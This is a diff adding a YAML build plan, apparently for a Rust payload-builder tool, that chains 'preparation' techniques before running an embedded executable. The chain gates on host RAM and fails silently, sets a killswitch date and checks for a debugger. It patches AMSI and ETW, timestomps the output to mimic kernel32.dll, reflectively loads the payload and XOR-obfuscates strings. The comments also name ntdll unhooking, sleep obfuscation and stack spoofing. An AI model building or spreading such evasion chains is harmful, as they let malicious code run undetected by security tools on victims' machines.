@@ -1,0 +1,55 @@
+# Preparation techniques: steps that adjust the current process (or gate the
+# chain) before the payload runs. A preparation returns `Ok(true)` to continue or
+# `Ok(false)` to abort, so any number of them can precede one Execution step.
+#
+#   cargo run -- build examples/plans/preparations.yaml
+#   .\dist\preparations.exe
+#
+# Order matters: the gate (`bouncer`) and the killswitch (`guardrail`) run first,
+# then the debugger check, then the AMSI/ETW patches, then the timestamp fix-up.
+#
+# NOT chained here on purpose:
+#   - `unhook_ntdll` restores ntdll's `.text` from a clean on-disk copy, which
+#     would silently undo `patch_etw` if it ran after it (both rewrite ntdll).
+#     Pick one or the other.
+#   - `self_deletion`, `sleep_obfuscation` and `stack_spoofing` live in
+#     `evasion.yaml` (they act on the running image or the syscall layer).
+
+schema: 6
+name: preparations
+
+build:
+  payloads:
+    payload:
+      source: ./examples/payloads/test_payload.exe
+  stub:
+    strings:
+      strategy: xor
+  output:
+    path: ./dist/preparations.exe
+
+runtime:
+  # Gate the chain on host properties (here: at least 512 MiB of RAM).
+  - technique: bouncer
+    params:
+      mode: all
+      on_fail: silent
+      min_ram_mb: 512
+
+  # Killswitch: abort past a deadline (and, optionally, after N runs).
+  - technique: guardrail
+    params:
+      expire_on: "2099-01-01"
+
+  # Abort if a debugger is attached (the default action).
+  - technique: anti_debug
+
+  - technique: patch_amsi
+  - technique: patch_etw
+
+  # Make the artifact look as old as a System32 DLL.
+  - technique: timestomping
+    params:
+      reference: "C:\\Windows\\System32\\kernel32.dll"
+
+  - technique: reflective_loading
